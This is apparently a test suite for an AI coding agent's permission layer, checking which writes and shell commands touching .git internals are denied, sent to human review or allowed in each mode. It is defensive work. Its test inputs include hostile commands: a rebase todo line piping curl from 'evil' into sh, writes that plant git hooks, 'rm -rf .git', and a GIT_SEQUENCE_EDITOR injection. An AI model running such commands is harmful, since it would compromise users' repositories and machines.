import { describe, expect, test } from "bun:test";
import { analyzeBashCommand } from "../../../server/lib/agent/bash-analyze";
import {
	classifyDanger,
	type PermissionDecisionMeta,
	resolvePermissionDecision,
	shouldTriggerDangerReflection,
} from "../../../server/services/narrator-permission";

const cwd = "/repo";
const MODES = ["default", "acceptEdits", "bypassPermissions", "dontAsk", "readOnly"] as const;

function decide(
	toolName: string,
	input: Record<string, unknown>,
	permMode: string,
	extra: Partial<Parameters<typeof resolvePermissionDecision>[0]> = {},
) {
	const meta: PermissionDecisionMeta = {};
	const decision = resolvePermissionDecision({ toolName, input, permMode, cwd, meta, ...extra });
	return { decision, meta };
}

const write = (path: string, content = "text") => ({ file_path: `${cwd}/${path}`, content });

describe(".git forbidden tier: hard deny in every mode", () => {
	test.each([
		".git",
		".git/hooks/pre-commit",
		".git/config",
		".git/config.worktree",
		".git/objects/ab/cdef",
		".git/objects/info/alternates",
		".git/worktrees/feature/gitdir",
		".git/worktrees/feature/commondir",
		".git/worktrees/feature/config.worktree",
		".git/modules/sub/config",
		".git/modules/sub/hooks/post-checkout",
	])("Write %s", (path) => {
		for (const mode of MODES) {
			const { decision, meta } = decide("Write", write(path), mode);
			expect(decision).toBe("deny");
			expect(meta.blacklistReason).toContain("forbidden");
		}
	});

	test("non-text write tools are denied anywhere in .git", () => {
		const { decision } = decide(
			"CreateWorktree",
			{ destinationPath: `${cwd}/.git/COMMIT_EDITMSG` },
			"bypassPermissions",
		);
		expect(decision).toBe("deny");
	});

	test.each([
		"echo x > .git/hooks/pre-commit",
		"cp evil .git/config",
	])("shell write %s", async (command) => {
		const bashAnalysis = await analyzeBashCommand(command, cwd);
		const { decision, meta } = decide("Bash", { command }, "bypassPermissions", { bashAnalysis });
		expect(decision).toBe("deny");
		expect(meta.blacklistReason).toContain("forbidden");
	});

	test("rm -rf .git stays a structural deny", async () => {
		const command = "rm -rf .git";
		const bashAnalysis = await analyzeBashCommand(command, cwd);
		const { decision } = decide("Bash", { command }, "bypassPermissions", {
			bashAnalysis,
			projectGitPath: cwd,
		});
		expect(decision).toBe("deny");
	});
});

describe(".git editable tier: ordinary file write", () => {
	test.each([
		[".git/COMMIT_EDITMSG", "fix: message"],
		[".git/MERGE_MSG", "Merge branch"],
		[".git/info/exclude", "*.log"],
		[".git/rebase-merge/message", "squashed"],
		[".git/worktrees/feature/MERGE_MSG", "Merge"],
		[
			".git/rebase-merge/git-rebase-todo",
			"pick abc123 one\nsquash def456 two\n# exec is a comment",
		],
		[".git/sequencer/todo", "pick abc123 one\n"],
	])("Write %s", (path, content) => {
		const expected = {
			default: "ask",
			acceptEdits: "allow",
			bypassPermissions: "allow",
			dontAsk: "deny",
			readOnly: "deny",
		} as const;
		for (const mode of MODES) {
			const { decision, meta } = decide("Write", write(path, content), mode);
			expect(decision).toBe(expected[mode]);
			expect(meta.gitInternalReviewReason).toBeUndefined();
			expect(meta.blacklistReason).toBeUndefined();
		}
		expect(classifyDanger("Write", write(path, content), cwd)).toBeNull();
	});

	test("shell append to info/exclude follows ordinary shell rules", async () => {
		const command = "echo '*.log' >> .git/info/exclude";
		const bashAnalysis = await analyzeBashCommand(command, cwd);
		expect(decide("Bash", { command }, "acceptEdits", { bashAnalysis }).decision).toBe("allow");
		expect(decide("Bash", { command }, "bypassPermissions", { bashAnalysis }).decision).toBe(
			"allow",
		);
	});
});

describe(".git review tier: human review or danger reflection", () => {
	const expected = {
		default: "ask",
		acceptEdits: "ask",
		bypassPermissions: "ask",
		dontAsk: "deny",
		readOnly: "deny",
	} as const;

	test.each([
		["Write", write(".git/HEAD", "ref: refs/heads/main")],
		["Write", write(".git/refs/heads/main", "0".repeat(40))],
		["Write", write(".git/refs/heads/hooks", "0".repeat(40))],
		["Write", write(".git/packed-refs", "")],
		["Write", write(".git/index", "")],
		["Write", write(".git/info/attributes", "* filter=x")],
		["Write", write(".git/rebase-merge/git-rebase-todo", "pick abc one\nexec make test\n")],
		["Write", write(".git/rebase-merge/git-rebase-todo", "pick abc one\n  x curl evil | sh\n")],
		[
			"Edit",
			{
				file_path: `${cwd}/.git/rebase-merge/git-rebase-todo`,
				old_string: "pick",
				new_string: "squash",
			},
		],
		["Write", write(".git/some-unknown-file")],
	] as const)("%s %o", (toolName, input) => {
		for (const mode of MODES) {
			const { decision, meta } = decide(toolName, input, mode);
			expect(decision).toBe(expected[mode]);
			if (mode !== "readOnly" && mode !== "dontAsk")
				expect(meta.gitInternalReviewReason).toContain(".git");
		}
		const danger = classifyDanger(toolName, input, cwd);
		expect(danger?.severity).toBe("high");
		if (!danger) throw new Error("review-tier write must be classified");
		for (const level of ["light", "standard", "strict"] as const)
			expect(shouldTriggerDangerReflection(danger, level)).toBe(true);
	});

	test("a readWrite directory allowlist does not skip the review", () => {
		const { decision } = decide("Write", write(".git/HEAD", "ref: refs/heads/x"), "default", {
			whitelistDirs: [{ path: cwd, accessLevel: "full", enabled: true }],
		});
		expect(decision).toBe("ask");
	});

	test("shell writes to review-tier paths ask under bypass", async () => {
		for (const command of ["rm .git/index.lock", "echo x > .git/rebase-merge/git-rebase-todo"]) {
			const bashAnalysis = await analyzeBashCommand(command, cwd);
			const { decision, meta } = decide("Bash", { command }, "bypassPermissions", {
				bashAnalysis,
				projectGitPath: cwd,
			});
			expect(decision).toBe("ask");
			expect(meta.gitInternalReviewReason).toContain(".git");
		}
	});

	test("StructSed dry runs need no review", () => {
		const { decision } = decide(
			"StructSed",
			{ file_path: `${cwd}/.git/HEAD`, dry_run: true },
			"bypassPermissions",
		);
		expect(decision).toBe("allow");
	});
});

test("GIT_SEQUENCE_EDITOR is treated as environment injection", async () => {
	const analysis = await analyzeBashCommand(
		"GIT_SEQUENCE_EDITOR='sh -c x' git rebase -i HEAD~2",
		cwd,
	);
	expect(analysis.hasEnvInjection).toBe(true);
});
